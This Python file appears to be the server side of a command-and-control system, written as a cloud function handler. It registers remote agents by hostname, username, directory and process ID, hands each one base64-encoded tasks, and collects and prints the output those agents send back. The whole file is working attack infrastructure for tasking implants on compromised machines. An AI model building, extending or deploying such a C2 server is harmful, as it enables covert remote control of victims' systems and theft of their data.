#!/usr/bin/env python3

import base64
import json
import logging

import agent_session
import agent_tasks


def handler(event, context):

    # setup logging
    logging.getLogger().setLevel(logging.INFO)

    # print new requests to console
    logging.info("received new request:")
    print('request: {}'.format(json.dumps(event)))

    # pass url/path and request body to routing function
    path = event['path']
    body = json.loads(event["body"])
    response = route_request(path, body)

    return response


def route_request(path: str, event_body):
    response = ""
    if path == "/get":
        response = handle_get_task(event_body)

    elif path == "/out":
        response = handle_post_task_output(event_body)

    else:
        logging.warning(f"received invalid request to: {path}")

    return response


def handle_get_task(event_body):

    # derive session ID from seed values: hostname, username, and agent directory
    logging.info("deriving session ID from agent info")
    session_id = agent_session.derive_session_id(
        event_body["hostname"], event_body["username"], event_body["agent_dir"], event_body["agent_pid"])

    logging.info(f"agent session ID is: {session_id}")

    # check if session is already registered
    logging.info("checking if agent is registered to C2 server")
    is_registered = agent_session.is_agent_registered(session_id)

    # if session is not registered, register to C2 server
    if not is_registered:
        logging.info("registering new agent session to C2 server")
        agent_session.register_agent(session_id, event_body)
        # ToDo - post new agent notification somewhere - maybe SNS?

    # get task for current session ID
    logging.info("getting agent task")
    task = agent_tasks.get_task(session_id)

    task_b64 = ""
    if task != "":
        # convert task to json
        logging.info("converting task to JSON")
        task_json = json.dumps(task)
        print(task_json)

        # base64 encode the task so it is easier to bring back
        logging.info("base64 encoding task:")
        task_b64 = base64.b64encode(bytes(task_json, "utf-8"))
        print(task_b64)

    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'text/plain'
        },
        'body': task_b64
    }


def handle_post_task_output(event_body):

    logging.info(f"received task output from agent:")

    # pretty print event_body
    print(json.dumps(event_body, indent=4))
    logging.info("task output:")
    print(event_body["task_output"])
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'text/plain'
        },
        'body': ''
    }
